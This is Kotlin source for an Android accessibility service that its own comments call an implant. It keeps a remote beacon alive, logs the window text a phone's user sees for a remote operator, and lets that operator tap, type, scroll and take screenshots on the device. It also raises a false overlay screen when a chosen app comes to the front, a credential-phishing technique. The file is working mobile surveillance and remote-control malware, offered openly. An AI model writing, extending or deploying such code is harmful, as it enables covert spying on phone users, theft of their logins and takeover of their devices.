package io.umbra.beacon

import android.accessibilityservice.AccessibilityService
import android.content.Intent
import android.media.AudioManager
import android.os.Handler
import android.os.Looper
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo

/**
 * The accessibility service of the implant.
 *
 * Android keeps an enabled accessibility service alive: it is the way the
 * platform offers to an application that must never be killed.  It is also
 * the most visible technique of the catalogue -- the user sees it in the
 * settings of Android, with the name of the application, and Android shows
 * a notification while it runs.
 *
 * The operator has to know that: the implant says in its report that this
 * technique is visible to the user of the phone.
 *
 * The service does two things for the team:
 *
 *   * it keeps the beacon alive (the first reason it exists), and
 *   * it gives the operator the window of the phone: the text the user is
 *     looking at, the log of the windows that changed, and a hand that
 *     presses the buttons, writes into the fields and scrolls.
 *
 * The actions run on the main thread of the phone, because that is where
 * the window lives; the task that asked for them waits on its own thread
 * (see `Ui`).
 */
class UmbraAccessibilityService : AccessibilityService() {
    /** The main thread of the phone: the window lives there. */
    private val handler = Handler(Looper.getMainLooper())

    override fun onServiceConnected() {
        super.onServiceConnected()
        Ui.attach(this)
        BeaconService.start(this)
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        // The log of the windows: the package, the window and the text that
        // came with the event.  It is what the operator reads when the
        // phone was used while nobody was looking.
        Ui.record(event)
        // The false screen waits for the application the operator named,
        // and this is the event that tells it that the application came
        // to the front.
        if (event != null && event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            val packageName = event.packageName?.toString() ?: ""
            if (packageName.isNotEmpty()) {
                Overlay.onWindow(this, packageName)
            }
        }
    }

    override fun onInterrupt() {
        // Nothing to interrupt.
    }

    override fun onUnbind(intent: Intent?): Boolean {
        // The service is gone: the operator has to enable it again.
        Ui.attach(null)
        return super.onUnbind(intent)
    }

    /**
     * Run one request of the operator on the main thread.
     *
     * The answer travels back through the latch of the request, so the
     * thread of the task never touches the window itself.
     */
    fun post(request: Ui.Request) {
        handler.post {
            try {
                request.answer = perform(request.action, request.args)
            } catch (t: Throwable) {
                request.error = t.message ?: t.toString()
            } finally {
                request.latch.countDown()
            }
        }
    }

    /** Do what the operator asked and say what the phone really did. */
    fun perform(action: String, args: Map<String, String>): String = when (action) {
        "screen" -> Ui.screen(rootInActiveWindow)
        "events" -> {
            val lines = Ui.log()
            if (lines.isEmpty()) {
                "no window change was seen yet\n"
            } else {
                lines.joinToString("\n") { "  $it" } + "\n"
            }
        }
        "tap" -> tap(args["needle"] ?: "", args["index"] ?: "0")
        "text" -> type(args["needle"] ?: "", args["value"] ?: "")
        "scroll" -> scroll(args["direction"] ?: "forward")
        "global" -> global(args["action"] ?: "back")
        else -> throw IllegalArgumentException("unknown ui action $action")
    }

    /** Press the button that carries the needle. */
    private fun tap(needle: String, index: String): String {
        val root = rootInActiveWindow
            ?: return "the window is not available\n"
        val found = Ui.matches(root, needle)
        if (found.isEmpty()) {
            return if (needle.isEmpty()) {
                "the window has no button to press\n"
            } else {
                "no node of the window carries \"$needle\"\n"
            }
        }
        val wanted = index.toIntOrNull() ?: 0
        val node = found.getOrNull(wanted)
            ?: return "\"$needle\" matched ${found.size} nodes, but there is no number $wanted\n"
        val done = node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
        return "pressed: ${Ui.describe(node)} (${if (done) "the window accepted it" else "the window refused it"})\n"
    }

    /** Write a text into the field that carries the needle. */
    private fun type(needle: String, value: String): String {
        val root = rootInActiveWindow
            ?: return "the window is not available\n"
        val fields = Ui.fields(root, needle)
        if (fields.isEmpty()) {
            return "the window has no editable field for \"$needle\"\n"
        }
        val node = fields.first()
        val done = node.performAction(
            AccessibilityNodeInfo.ACTION_SET_TEXT,
            Ui.textBundle(value),
        )
        return "wrote into: ${Ui.describe(node)} (${if (done) "the window accepted it" else "the window refused it"})\n"
    }

    /** Scroll the window. */
    private fun scroll(direction: String): String {
        val root = rootInActiveWindow
            ?: return "the window is not available\n"
        val action = if (direction.equals("back", ignoreCase = true)) {
            AccessibilityNodeInfo.ACTION_SCROLL_BACKWARD
        } else {
            AccessibilityNodeInfo.ACTION_SCROLL_FORWARD
        }
        val done = root.performAction(action)
        return "scrolled $direction (${if (done) "the window accepted it" else "the window refused it"})\n"
    }

    /** The system keys of the phone. */
    private fun global(action: String): String {
        val wanted = action.lowercase()
        // Volume is not a global action of the accessibility service: there
        // is no GLOBAL_ACTION_VOLUME_* in the platform.  The sound of the
        // phone is the audio manager's, so it is asked there.
        if (wanted == "volume_up" || wanted == "volume_down") {
            return volume(up = wanted == "volume_up")
        }
        val code = when (wanted) {
            "back" -> GLOBAL_ACTION_BACK
            "home" -> GLOBAL_ACTION_HOME
            "recents", "recent" -> GLOBAL_ACTION_RECENTS
            "notifications" -> GLOBAL_ACTION_NOTIFICATIONS
            // The power key opens the power dialog; the platform has no
            // "power dialer" action, so the old alias went with it.
            "power" -> GLOBAL_ACTION_POWER_DIALOG
            "screenshot" -> GLOBAL_ACTION_TAKE_SCREENSHOT
            else -> throw IllegalArgumentException("unknown global action $action")
        }
        val done = performGlobalAction(code)
        return "global $action (${if (done) "the phone accepted it" else "the phone refused it"})\n"
    }

    /** The volume keys, through the audio manager of the phone. */
    private fun volume(up: Boolean): String {
        val audio = getSystemService(AudioManager::class.java)
            ?: return "global volume: the phone has no audio manager\n"
        try {
            audio.adjustStreamVolume(
                AudioManager.STREAM_MUSIC,
                if (up) AudioManager.ADJUST_RAISE else AudioManager.ADJUST_LOWER,
                AudioManager.FLAG_SHOW_UI,
            )
        } catch (t: Throwable) {
            return "global volume: the phone refused it (${t.message ?: "no reason given"})\n"
        }
        return "global ${if (up) "volume_up" else "volume_down"} (the phone adjusted the music stream)\n"
    }

    companion object {
        /** The component the operator enables in the settings. */
        const val COMPONENT = "io.umbra.beacon/.UmbraAccessibilityService"
    }
}
